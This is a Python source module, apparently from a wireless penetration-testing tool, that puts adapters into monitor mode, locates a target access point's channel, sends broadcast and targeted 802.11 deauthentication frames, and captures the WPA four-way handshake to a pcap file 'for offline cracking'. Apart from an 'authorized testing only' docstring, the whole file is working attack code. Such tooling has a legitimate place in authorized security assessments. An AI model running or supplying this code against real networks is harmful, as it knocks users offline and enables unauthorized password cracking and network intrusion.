"""
WiFi Attack Module - Monitor mode, deauth, WPA handshake capture.
Uses Scapy for 802.11 frame crafting and EAPOL sniffing.
Full support on Linux; best-effort on Windows (Npcap + compatible adapter).
WARNING: Authorized testing only.
"""

import os
import platform
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional, Tuple

try:
    from scapy.all import (
        Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
        EAPOL, RadioTap, Ether,
        sendp, sniff, wrpcap, conf,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

_IS_LINUX = platform.system() == "Linux"
_IS_WINDOWS = platform.system() == "Windows"
_IS_MAC = platform.system() == "Darwin"

SCANS_DIR = Path(__file__).resolve().parent.parent / "scans"


@dataclass
class HandshakeCapture:
    bssid: str
    ssid: str
    client_mac: str = ""
    eapol_frames: list = field(default_factory=list)
    pcap_path: str = ""
    complete: bool = False
    messages_captured: int = 0


def _run_cmd(cmd: list[str], timeout: int = 10) -> Tuple[int, str, str]:
    """Run a command, return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        return -1, "", f"Command not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return -2, "", "Command timed out"


def list_wireless_interfaces() -> List[dict]:
    """List wireless interfaces. Returns [{name, driver, mode, mac}]."""
    interfaces = []
    if _IS_LINUX:
        iw_rc, iw_out, _ = _run_cmd(["iw", "dev"])
        if iw_rc == 0:
            current: dict = {}
            for line in iw_out.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    if current.get("name"):
                        interfaces.append(current)
                    current = {"name": line.split()[-1], "driver": "", "mode": "", "mac": ""}
                elif line.startswith("addr"):
                    current["mac"] = line.split()[-1]
                elif line.startswith("type"):
                    current["mode"] = line.split()[-1]
            if current.get("name"):
                interfaces.append(current)
        if not interfaces:
            try:
                for iface in Path("/sys/class/net").iterdir():
                    wireless_dir = iface / "wireless"
                    if wireless_dir.exists():
                        interfaces.append({"name": iface.name, "driver": "", "mode": "managed", "mac": ""})
            except Exception:
                pass
    elif _IS_WINDOWS:
        rc, out, _ = _run_cmd(["netsh", "wlan", "show", "interfaces"])
        if rc == 0:
            current = {}
            for line in out.splitlines():
                line = line.strip()
                if ":" in line:
                    k, _, v = line.partition(":")
                    k, v = k.strip().lower(), v.strip()
                    if "name" in k and "profile" not in k:
                        if current.get("name"):
                            interfaces.append(current)
                        current = {"name": v, "driver": "", "mode": "managed", "mac": ""}
                    elif "physical" in k or "mac" in k:
                        current["mac"] = v
                    elif "state" in k:
                        current["mode"] = v
            if current.get("name"):
                interfaces.append(current)
    return interfaces


def check_monitor_support(interface: str) -> Tuple[bool, str]:
    """Check if an interface supports monitor mode. Returns (supported, reason)."""
    if not SCAPY_AVAILABLE:
        return False, "Scapy not installed (pip install scapy)"

    if _IS_LINUX:
        rc, out, _ = _run_cmd(["iw", "phy"])
        if rc != 0:
            rc2, out2, _ = _run_cmd(["iw", "list"])
            if rc2 == 0:
                out = out2
        if "monitor" in out.lower():
            return True, "Monitor mode supported (iw)"
        rc, out, _ = _run_cmd(["airmon-ng"])
        if rc == 0 and interface in out:
            return True, "Monitor mode supported (airmon-ng)"
        return False, "Monitor mode not detected. Install aircrack-ng or use a compatible adapter."

    elif _IS_WINDOWS:
        try:
            from scapy.arch.windows import get_windows_if_list
            for iface in get_windows_if_list():
                if interface.lower() in str(iface.get("name", "")).lower() or interface.lower() in str(iface.get("description", "")).lower():
                    return False, (
                        "Windows has very limited monitor mode support. "
                        "Use a compatible USB WiFi adapter with Npcap raw 802.11 mode, or use Linux."
                    )
        except Exception:
            pass
        return False, "Monitor mode on Windows requires Npcap + compatible adapter. Linux recommended."

    return False, f"Unsupported platform: {platform.system()}"


def enable_monitor_mode(interface: str) -> Tuple[bool, str]:
    """
    Enable monitor mode on the interface.
    Returns (success, monitor_interface_name).
    """
    if not _IS_LINUX:
        return False, f"Monitor mode not supported on {platform.system()}. Use Linux."

    # Try iw first
    _run_cmd(["ip", "link", "set", interface, "down"])
    rc, _, err = _run_cmd(["iw", interface, "set", "monitor", "control"])
    if rc == 0:
        _run_cmd(["ip", "link", "set", interface, "up"])
        print(f"  Monitor mode enabled on {interface} (iw)")
        return True, interface

    # Fallback: airmon-ng
    rc, out, _ = _run_cmd(["airmon-ng", "start", interface], timeout=15)
    if rc == 0:
        mon_iface = interface + "mon"
        for line in out.splitlines():
            if "monitor mode" in line.lower() and "enabled" in line.lower():
                parts = line.split()
                for p in parts:
                    if "mon" in p:
                        mon_iface = p.strip("()[]")
                        break
        print(f"  Monitor mode enabled: {mon_iface} (airmon-ng)")
        return True, mon_iface

    return False, f"Failed to enable monitor mode: {err}"


def disable_monitor_mode(interface: str) -> bool:
    """Restore managed mode on the interface."""
    if not _IS_LINUX:
        return False

    _run_cmd(["ip", "link", "set", interface, "down"])
    rc, _, _ = _run_cmd(["iw", interface, "set", "type", "managed"])
    if rc == 0:
        _run_cmd(["ip", "link", "set", interface, "up"])
        print(f"  Managed mode restored on {interface}")
        return True

    rc, _, _ = _run_cmd(["airmon-ng", "stop", interface], timeout=15)
    if rc == 0:
        print(f"  Managed mode restored (airmon-ng): {interface}")
        return True

    return False


def set_channel(interface: str, channel: int) -> bool:
    """Set the wireless interface to a specific channel."""
    if _IS_LINUX:
        rc, _, _ = _run_cmd(["iw", interface, "set", "channel", str(channel)])
        return rc == 0
    return False


def scan_target_channel(interface: str, bssid: str, timeout: int = 10) -> Optional[int]:
    """
    Sniff beacons to find the channel for a target BSSID.
    Returns channel number or None.
    """
    if not SCAPY_AVAILABLE:
        return None

    bssid_lower = bssid.lower()
    found_channel = [None]

    def _handler(pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            addr = (pkt[Dot11].addr3 or "").lower()
            if addr == bssid_lower:
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3:  # DS Parameter Set = channel
                        found_channel[0] = int.from_bytes(elt.info[:1], "little")
                        return True
                    elt = elt.payload.getlayer(Dot11Elt)
        return False

    for ch in list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64, 149, 153, 157, 161, 165]:
        if found_channel[0]:
            break
        set_channel(interface, ch)
        try:
            sniff(iface=interface, prn=_handler, stop_filter=_handler, timeout=0.5, store=0)
        except Exception:
            pass
    return found_channel[0]


def deauth_client(
    interface: str,
    bssid: str,
    client_mac: Optional[str] = None,
    count: int = 5,
) -> int:
    """
    Send deauth frames to force client reconnection (triggers handshake).
    Broadcast deauth if client_mac is None.
    Returns number of frames sent.
    """
    if not SCAPY_AVAILABLE:
        return 0

    target = client_mac or "ff:ff:ff:ff:ff:ff"
    frame = (
        RadioTap()
        / Dot11(addr1=target, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    sent = 0
    for _ in range(count):
        try:
            sendp(frame, iface=interface, count=1, inter=0.05, verbose=0)
            sent += 1
        except Exception:
            break
    return sent


def capture_handshake(
    interface: str,
    bssid: str,
    ssid: str,
    timeout: int = 120,
    deauth: bool = True,
    deauth_interval: int = 15,
    on_progress: Optional[Callable[[str], None]] = None,
) -> HandshakeCapture:
    """
    Capture WPA 4-way handshake for the target network.
    Optionally sends deauth bursts to speed up capture.
    Saves pcap to scans/ for offline cracking.
    """
    if not SCAPY_AVAILABLE:
        if on_progress:
            on_progress("Scapy not available. Cannot capture handshake.")
        return HandshakeCapture(bssid=bssid, ssid=ssid)

    SCANS_DIR.mkdir(parents=True, exist_ok=True)
    safe_ssid = "".join(c if c.isalnum() or c in "-_" else "_" for c in ssid)
    pcap_path = str(SCANS_DIR / f"handshake_{safe_ssid}_{int(time.time())}.pcap")

    bssid_lower = bssid.lower()
    eapol_frames: list = []
    client_macs: set = set()
    msg_numbers: set = set()

    def _log(msg: str):
        print(f"  {msg}")
        if on_progress:
            on_progress(msg)

    def _pkt_handler(pkt):
        if pkt.haslayer(EAPOL):
            src = (pkt[Dot11].addr2 or "").lower() if pkt.haslayer(Dot11) else ""
            dst = (pkt[Dot11].addr1 or "").lower() if pkt.haslayer(Dot11) else ""
            if bssid_lower in (src, dst):
                eapol_frames.append(pkt)
                client = src if src != bssid_lower else dst
                if client and client != "ff:ff:ff:ff:ff:ff":
                    client_macs.add(client)
                eapol_raw = bytes(pkt[EAPOL])
                key_info = int.from_bytes(eapol_raw[5:7], "big") if len(eapol_raw) > 6 else 0
                has_mic = bool(key_info & 0x0100)
                has_secure = bool(key_info & 0x0200)
                has_ack = bool(key_info & 0x0080)
                has_install = bool(key_info & 0x0040)
                if has_ack and not has_mic:
                    msg_numbers.add(1)
                elif has_mic and not has_secure and not has_install:
                    msg_numbers.add(2)
                elif has_ack and has_mic and has_install:
                    msg_numbers.add(3)
                elif has_mic and has_secure and not has_ack:
                    msg_numbers.add(4)
                _log(f"EAPOL frame captured (msg {max(msg_numbers) if msg_numbers else '?'}, total: {len(eapol_frames)}, client: {client})")

    _log(f"Listening for handshake on {bssid} ({ssid})...")
    start = time.time()
    last_deauth = 0

    while time.time() - start < timeout:
        if len(msg_numbers) >= 2 and (1 in msg_numbers or 2 in msg_numbers):
            if (1 in msg_numbers and 2 in msg_numbers) or (2 in msg_numbers and 3 in msg_numbers):
                _log("Handshake captured (sufficient EAPOL messages)!")
                break

        if deauth and (time.time() - last_deauth > deauth_interval):
            _log("Sending deauth burst...")
            deauth_client(interface, bssid, count=5)
            for cm in list(client_macs)[:3]:
                deauth_client(interface, bssid, client_mac=cm, count=3)
            last_deauth = time.time()

        try:
            sniff(iface=interface, prn=_pkt_handler, timeout=min(5, deauth_interval), store=0,
                  lfilter=lambda p: p.haslayer(EAPOL))
        except Exception as e:
            _log(f"Sniff error: {e}")
            time.sleep(1)

    complete = len(msg_numbers) >= 2 and (
        (1 in msg_numbers and 2 in msg_numbers)
        or (2 in msg_numbers and 3 in msg_numbers)
    )

    if eapol_frames:
        try:
            wrpcap(pcap_path, eapol_frames)
            _log(f"Handshake saved to {pcap_path}")
        except Exception as e:
            _log(f"Failed to save pcap: {e}")
            pcap_path = ""
    else:
        _log("No EAPOL frames captured.")
        pcap_path = ""

    return HandshakeCapture(
        bssid=bssid,
        ssid=ssid,
        client_mac=next(iter(client_macs), ""),
        eapol_frames=eapol_frames,
        pcap_path=pcap_path,
        complete=complete,
        messages_captured=len(msg_numbers),
    )


def detect_wps(bssid: str, scan_results: list) -> bool:
    """Check if the target has WPS enabled (from WiFi scan data or beacons)."""
    for net in scan_results:
        b = getattr(net, "bssid", None) or net.get("bssid", "")
        if b.lower() == bssid.lower():
            sec = getattr(net, "security", None) or net.get("security", "")
            if "wps" in sec.lower():
                return True
    return False
